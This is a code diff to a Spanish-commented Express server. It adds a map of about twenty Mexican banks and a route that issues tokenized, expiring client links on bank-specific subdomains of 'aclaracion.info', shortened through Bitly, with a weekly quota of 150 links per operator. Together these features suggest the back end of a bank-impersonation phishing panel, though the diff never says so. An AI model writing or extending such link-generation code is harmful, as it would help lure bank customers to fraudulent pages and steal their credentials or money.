@@ -51,6 +51,29 @@ const upload = multer({
   }
 });
 
+// Helper para mapear banco de UI (mayúsculas) a BankType (minúsculas)
+const BANK_UI_TO_TYPE: Record<string, BankType> = {
+  'AFIRME': BankType.AFIRME,
+  'CITIBANAMEX': BankType.CITIBANAMEX,
+  'BANORTE': BankType.BANORTE,
+  'BBVA': BankType.BBVA,
+  'SANTANDER': BankType.SANTANDER,
+  'HSBC': BankType.HSBC,
+  'SCOTIABANK': BankType.SCOTIABANK,
+  'INBURSA': BankType.INBURSA,
+  'BANCO_AZTECA': BankType.BANCOAZTECA,
+  'BANCOAZTECA': BankType.BANCOAZTECA,
+  'LIVERPOOL': BankType.LIVERPOOL,
+  'BANBAJIO': BankType.BANBAJIO,
+  'BANCOPPEL': BankType.BANCOPPEL,
+  'AMEX': BankType.AMEX,
+  'INVEX': BankType.INVEX,
+  'BANREGIO': BankType.BANREGIO,
+  'SPIN': BankType.SPIN,
+  'PLATACARD': BankType.PLATACARD,
+  'BIENESTAR': BankType.BIENESTAR,
+};
+
 export async function registerRoutes(app: Express): Promise<Server> {
   // Setup authentication
   setupAuth(app);
@@ -1453,7 +1476,54 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
         ? `${protocol}://${baseUrl}` 
         : `https://${adminDomain}`;
 
-      // Enlace generado correctamente
+      // ===== NUEVA INTEGRACIÓN CON BITLY Y SUBDOMINIOS =====
+      let shortUrl: string | undefined;
+      let expiresAt: Date | undefined;
+      let linkCreationError: string | undefined;
+      let tokenizedUrl: string | undefined;
+
+      try {
+        // Mapear banco UI a BankType (normalizar a mayúsculas para case-insensitive)
+        const bankCode = BANK_UI_TO_TYPE[(banco as string).toUpperCase()];
+        
+        if (bankCode) {
+          console.log(`[Links] Generando link con Bitly para banco ${bankCode}, sessionId: ${sessionId}`);
+          
+          // Crear link con token único, Bitly y subdominio
+          const linkResult = await linkTokenService.createLink({
+            userId: user.id,
+            bankCode,
+            sessionId,
+            metadata: {
+              createdBy: (user as any).isExecutive ? (user as any).officeUsername : user.username,
+              executiveId: (user as any).isExecutive && (user as any).id ? String((user as any).id) : undefined
+            }
+          });
+          
+          shortUrl = linkResult.shortUrl;
+          tokenizedUrl = linkResult.originalUrl; // Link con token (banco.aclaracion.info/client/TOKEN)
+          expiresAt = linkResult.expiresAt;
+          
+          console.log(`[Links] ✅ Link con token y Bitly creado exitosamente: ${shortUrl || tokenizedUrl}`);
+        } else {
+          console.log(`[Links] ⚠️ Banco ${banco} no mapeado a BankType, usando link largo`);
+        }
+      } catch (error: any) {
+        // Si es error de cuota, propagar como 429
+        if (error.message?.includes('cuota semanal') || error.message?.includes('límite semanal')) {
+          console.error(`[Links] ❌ Cuota semanal agotada para usuario ${user.id}`);
+          return res.status(429).json({ 
+            error: 'Has alcanzado tu límite semanal de links (150). La cuota se resetea cada lunes.',
+            quotaExhausted: true
+          });
+        }
+        
+        // Para otros errores (Bitly, BD, etc.), loguear pero continuar con link largo
+        console.error(`[Links] ⚠️ Error generando link con Bitly (usando fallback):`, error.message);
+        linkCreationError = error.message;
+      }
+
+      // Enlace generado correctamente (largo o corto)
 
       // Notificando clientes admin
       
@@ -1500,12 +1570,14 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
         banco: banco as string,
         folio: linkCode,
         createdBy: user.username,
-        link: clientLink
+        link: shortUrl || tokenizedUrl || clientLink // Preferir link corto, luego tokenizado, luego largo
       });
 
       res.json({ 
         sessionId, 
-        link: clientLink, 
+        link: tokenizedUrl || clientLink, // Preferir link tokenizado, luego largo para compatibilidad
+        shortUrl, // Opcional: link corto de Bitly con subdominio
+        expiresAt, // Opcional: fecha de expiración del token
         adminLink: adminLink,
         code: linkCode
       });
